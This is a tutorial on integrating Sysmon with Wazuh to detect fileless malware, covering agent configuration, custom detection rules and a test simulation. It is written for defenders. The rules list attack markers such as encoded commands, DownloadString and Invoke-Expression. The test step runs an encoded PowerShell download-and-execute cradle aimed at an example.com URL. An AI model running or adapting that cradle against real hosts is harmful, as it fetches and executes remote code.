Here are the step-by-step instructions for **Integrating Sysmon with Wazuh to Detect Fileless Malware**:

1. **Verify Sysmon Event Channel on Windows Endpoint:** Ensures Sysmon captures process injection and encoded execution telemetry.
1. Ensure **Sysmon** is installed on the target Windows agent using a security-focused XML configuration (such as SwiftOnSecurity or Olaf Hartong `sysmon-config.xml`).
2. Confirm Sysmon is actively logging events by opening **Event Viewer** and navigating to:
`Applications and Services Logs` → `Microsoft` → `Windows` → `Sysmon` → `Operational`.


2. **Forward Sysmon Event Channel to Wazuh Manager:** Configures Wazuh to ingest Sysmon logs.
Add the Sysmon event channel to your agent configuration (either locally in `C:\Program Files (x86)\ossec-agent\ossec.conf` or centrally via `agent.conf` on the Wazuh Dashboard):

```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>

```

Restart the Wazuh Agent service to apply the configuration:

```powershell
Restart-Service Wazuh

```


3. **Configure Custom Wazuh Rules for Fileless Malware:** Path: /var/ossec/etc/rules/local_rules.xml on Wazuh Manager.
1. Open a terminal on your **Wazuh Manager** server and open the local rules file:

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml

```

2. Add custom rules targeting fileless malware techniques (such as encoded PowerShell execution, `Invoke-Expression`, memory injection, or suspicious process spawns):

```xml
<group name="sysmon,fileless_malware,">
  <!-- Detect Encoded PowerShell Execution -->
  <rule id="100050" level="12">
    <if_sid>18466</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-enc|-encodedcommand|downloadstring|iex|invoke-expression|-w hidden</field>
    <description>Sysmon - Suspicious Fileless PowerShell Execution Detected</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

  <!-- Detect Remote Thread Injection (Sysmon Event ID 8) -->
  <rule id="100051" level="14">
    <if_sid>18473</if_sid>
    <description>Sysmon - Process Injection / CreateRemoteThread Detected (Possible Fileless In-Memory Execution)</description>
    <mitre>
      <id>T1055</id>
    </mitre>
  </rule>
</group>

```


4. **Restart Wazuh Manager:** Applies newly defined detection rules.
Restart the Wazuh Manager service to load the custom detection rules:

```bash
sudo systemctl restart wazuh-manager

```


5. **Simulate Fileless Execution on Windows Agent:** Generates memory-only / Living-off-the-Land telemetry.
On the Windows endpoint, test detection by executing a benign fileless PowerShell command in PowerShell as Administrator:

```powershell
powershell.exe -e aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHhhAG0AcABsAGUALgBjAG8AbQAnACkA

```


6. **Verify Fileless Malware Alerts in Wazuh Dashboard:** Monitors alerts generated by custom rules.
1. Log in to your **Wazuh Dashboard**.
2. Navigate to **Threat Hunting** → **Events** (or **Security Events**).
3. Search for your custom rule ID (`100050` or `100051`) or group `fileless_malware`.
4. Confirm that the alert triggers with details including the parent process, process command line, and MITRE ATT&CK techniques (`T1059.001`).
